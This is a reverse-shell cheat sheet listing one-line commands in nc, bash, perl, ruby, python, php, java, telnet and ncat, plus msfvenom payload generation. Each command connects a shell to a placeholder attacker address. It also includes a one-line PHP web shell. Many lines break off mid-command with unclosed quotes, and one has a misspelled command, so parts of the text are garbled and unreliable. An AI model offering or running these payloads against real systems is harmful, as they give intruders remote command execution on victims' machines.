# **one liner**

#Without -e flag  
  
rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p  
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x  
telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443  
  
#perl  
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'  
  
#ruby  
ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'  
  
#python  
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  
  
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x  
  
  
#nc  
echo "nc -e /bin/bash x.x.x.x  
echo "0<&60-;exec 60<>/dev/tcp/x.x.x.x  
nc -e /bin/sh x.x.x.x  
  
  
#php  
<?php system($_GET['cmd']) ?>  
php -r '$sock=fsockopen("x.x.x.x  
  
  
#bash  
x.x.x.x; bash -i >& /dev/tcp/x.x.x.x  
bash -i >& /dev/tcp/x.x.x.x  
echo ‘0<&74-;exec 74<>/dev/tcp/x.x.x.x  
  
  
#python  
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x  
  
  
  
msfvenom -p cmd/unix/reverse_python lhost=x.x.x.x  
  
  
#bash  
0<&196;exec 196<>/dev/tcp/x.x.x.x  
bash -i >& /dev/tcp/x.x.x.x  
  
#php  
php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'  
  
  
  
.exec mkfinfo /tmp/cdbe; nc x.x.x.x  
  
  
#java  
r = Runtime.getRuntime()  
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/x.x.x.x  
p.waitFor()  
  
NCAT  
#bind  
  
ncat --exec cmd.exe --allow x.x.x.x  
ncat -v x.x.x.x  
  
#telnet  
rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p  
  
#jsp  
msfvenom -p java/jsp_shell_reverse_tcp LHOST=x.x.x.x